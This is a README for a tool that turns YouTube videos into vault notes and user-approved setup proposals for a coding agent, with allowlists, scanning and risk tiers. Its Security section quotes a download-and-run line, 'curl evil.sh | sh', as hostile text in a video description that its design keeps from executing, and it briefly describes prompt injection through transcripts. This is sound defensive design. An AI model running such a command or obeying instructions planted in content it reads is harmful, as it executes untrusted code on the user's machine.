# Self-Learning Agent

**Point your coding agent at a video. Get a note you'll keep, and a setup you approved.**

> **Status: v1 complete.** `/learn-from <url>` produces a vault note with validated
> proposals, and `sla apply` reviews them one at a time behind a SkillSpector scan.
> Nothing is ever applied without you saying yes. 178 tests, 83% coverage, CI on
> Python 3.10–3.13. Architecture is in [PLAN.md](PLAN.md); to pick the work up cold,
> read [HANDOVER.md](HANDOVER.md).

---

## The problem

Creators like [Greg Isenberg](http://youtube.com/@GregIsenberg) ship videos about
building with AI agents faster than anyone can absorb them — which MCP server to use,
which repo to clone, which prompting pattern actually works. The advice is good. The
throughput is the problem.

By the time you need a technique, you've forgotten which video it was in, and you
definitely haven't set it up.

This turns that firehose into two things you can use: **a note in your vault**, and
**a list of setup actions you explicitly approve**.

## What it does

```bash
/learn-from https://youtube.com/watch?v=...   # one video
/learn-from @GregIsenberg                     # a channel's latest
```

Or from a shell:

```bash
sla brief "<url>" --out brief.json   # gather
sla note  "<url>" --synthesis s.json # render the note
sla apply "<url>"                    # review proposals, one at a time
```

It pulls the transcript, description, and chapters; checks what you already have
installed; writes an Obsidian note; and — only if you approve, item by item —
installs and configures what's worth having.

### It knows what you already own

Before writing anything, the pipeline inventories your installed skills, MCP servers,
and CLIs. So the note says:

> Video recommends Playwright MCP — **you already have it**. The new part is the
> selector-retry pattern it demonstrates, which is worth adding as a skill.

instead of handing you a list of things you installed months ago. It gets *sharper*
the more you already have, not noisier.

### Two kinds of video, two payoffs

The pipeline classifies the source and shifts the weight of the note accordingly:

| Class | Example | What you get |
|---|---|---|
| **tooling** | "I built this with Claude Code and 3 MCP servers" | Concrete setup actions, ready to approve |
| **conceptual** | "5 AI business ideas for 2026" | Developed project ideas — stack, first command, honest time estimate |
| **mixed** | Both | Both |

For a conceptual video there is usually **nothing to install, and it says so.**
Which brings us to the design rule that matters most:

### It's allowed to find nothing

Most videos teach nothing installable. If a tool like this is *expected* to produce
actions, it will manufacture them — and that is precisely what makes these tools
untrustworthy. `proposals: []` is a valid, common, correct output here.

Same reason every note carries a mandatory **Gaps & uncertainty** section: videos demo
things on screen while the audio says "just paste this in here," and auto-captions
mangle the exact words that matter (`MCP` → `mcp`, `n8n` → `an eight n`). The note
tells you what it couldn't see rather than papering over it.

## Security

This tool reads text written by strangers and can install software. That deserves a
real answer, not a disclaimer.

**The agent never emits a shell command.** A proposal can only name a package on a
known registry:

```json
{ "kind": "package", "manager": "npm", "name": "@playwright/mcp" }
```

The Python layer renders the command from a template. There is no path from transcript
text to `bash` — a video description containing `curl evil.sh | sh` cannot become an
executed command, because "a command" is not something a proposal is able to express.

**Agent-facing content is scanned before it activates.** Skills are staged in the repo,
scanned with [SkillSpector](https://github.com/NVIDIA/skillspector), and only copied
into your skills directory if you approve. A scan that could not fully run is reported
as weak evidence, never as a pass.

On top of that:

- **Risk tiers.** Anything off the allowlist, anything needing a secret, anything
  cloned-and-run is tier `high` — printed as manual instructions, **never** automated.
- **Secrets are never handled.** If a tool needs an API key, you get the key *name* in
  a `.env` stub. No value is ever read, written, or transmitted.
- **Every action is reversible.** Each applied proposal records its own undo command.
- **Nothing outside your vault is touched before you approve.**

Full model in [PLAN.md §8](PLAN.md). The adversarial-transcript test suite is the one
that isn't allowed to go red.

## Install

Requires Python 3.10+ and [uv](https://docs.astral.sh/uv/) (or pip).

```bash
git clone https://github.com/Soham-1827/Self-Learning-Agent-Claude.git
cd Self-Learning-Agent-Claude
uv venv --python 3.12 .venv
uv pip install --python .venv/bin/python -e ".[dev]"
```

For the `/learn-from` command in Claude Code, copy the plugin pieces into your
config directory:

```bash
cp -r skills/learn-from-source ~/.claude/skills/
cp commands/learn-from.md ~/.claude/commands/
ln -s "$PWD/.venv/bin/sla" ~/.local/bin/sla
```

Then point it at a vault by writing `~/.self-learning-agent/config.json`:

```json
{ "vault_path": "~/LearningVault", "vault_subdir": "Sources", "install_mode": "copy" }
```

Scanning needs [SkillSpector](https://github.com/NVIDIA/skillspector)
(`uv tool install git+https://github.com/NVIDIA/skillspector.git`). Without it the
gate refuses to activate any skill, by design.

## Applying proposals

Writing a note installs nothing. Read the note, then:

```bash
sla apply "<url>" --dry-run     # scan and decide; change nothing
sla apply "<url>"               # scan, decide, then ask about each proposal
sla apply "<url>" --only p1     # a single proposal
```

Run it from a real terminal, since it prompts. For each proposal it prints the risk
tier, the exact command it would run, and the scan verdict, then decides:

| Decision | What happens |
|---|---|
| `confirm` | You are asked `[y/N]`. Anything other than `y` skips it. |
| `BLOCKED` | Never offered: off the allowlist, needs a secret, manual by nature, or a skill the scan says not to install. The command is printed for you instead. |

Saying yes does exactly one thing per kind:

| Kind | Effect |
|---|---|
| `skill` | Writes `~/.claude/skills/<name>/SKILL.md` with the content that was scanned |
| `repo_clone` | Clones into `~/.self-learning-agent/staging/` — nothing in it is executed |
| `package` | Installs with the allowlisted package manager |
| `mcp_server` | Adds an entry to your MCP config, after backing it up |

Every applied action is appended to the note's **Applied** section with its undo
command.

Worth knowing:

- **`CAUTION` is the ordinary verdict.** SkillSpector does not return `SAFE` from a
  static-only scan, even with zero findings.
- **Omit `--no-llm` for decisions that matter.** Semantic analysis needs a provider
  key (for example `SKILLSPECTOR_PROVIDER=openai` with `OPENAI_API_KEY`).
- **A skill is refused if its staged copy changed after the scan**, or if anything
  besides `SKILL.md` sits beside it. Run `sla apply` again to rescan.
- **`--yes` skips the prompts.** Blocked proposals still never run.

## Design

```
PLAN phase — no side effects outside the vault
  resolve → dedupe → fetch → inventory → synthesize → write note
                        ↓
              ██ YOU REVIEW THE NOTE ██
                        ↓
APPLY phase — touches your machine
  gate → apply → record
```

Deterministic work (fetching, caching, deduping, rendering, guarded installs) is
tested Python. Judgment (classification, synthesis, authoring skills) is the agent.
The seam between them is a validated JSON contract, which is also what makes the
security model enforceable.

**No API keys required.** `yt-dlp` handles channel listings and captions anonymously.

## Roadmap

| | Milestone | |
|---|---|---|
| M0 | Repo skeleton, CI, license | ✅ |
| M1 | Fetch + cache + ledger | ✅ |
| M2 | Inventory of installed skills/MCPs | ✅ |
| M3 | `/learn-from` → vault note + proposals | ✅ |
| M4 | Approval gate + apply | ✅ |
| M5 | Channel batch processing | |
| M6 | Scheduled polling | |
| M7 | Web frontend — paste any link | |

## What it looks like on real videos

Three sources have been run end to end, chosen to stress different parts of the design:

| Video | Class | Result |
|---|---|---|
| *5 GitHub Repos* (Greg Isenberg) | `tooling` | 3 proposals — one dropped because `brand-voice` already covered it |
| *How to beat low stakes poker* | `conceptual` | 0 proposals, 2 project ideas |
| *How the Periodic Table Works* (StarTalk) | `conceptual` | 0 proposals, 1 project idea |

The poker and periodic-table videos have no chapters, no GitHub links, and nothing
installable. They still produce notes worth keeping — and correctly propose nothing.
That is the design working, not failing.

## Known limitations

1. **Screen content is lost.** Frame sampling with vision is deferred as too expensive
   for v1; description links cover most of the gap.
2. **ASR mangles product names.** Mitigated by reading the human-typed description, not
   solved. Low-confidence names are flagged in the note.
3. **No members-only or paywalled content.**
4. **Quality is bounded by the creator.** This faithfully relays what a video claims.
   It does not independently verify that the advice is any good.

## Contributing

Early — the most useful contribution right now is disagreement with
[PLAN.md](PLAN.md). Open an issue.

Transcript fixtures for the test suite are the highest-value contribution —
especially adversarial ones, and sources that break the assumptions in PLAN.md §19–§20.

## License

MIT
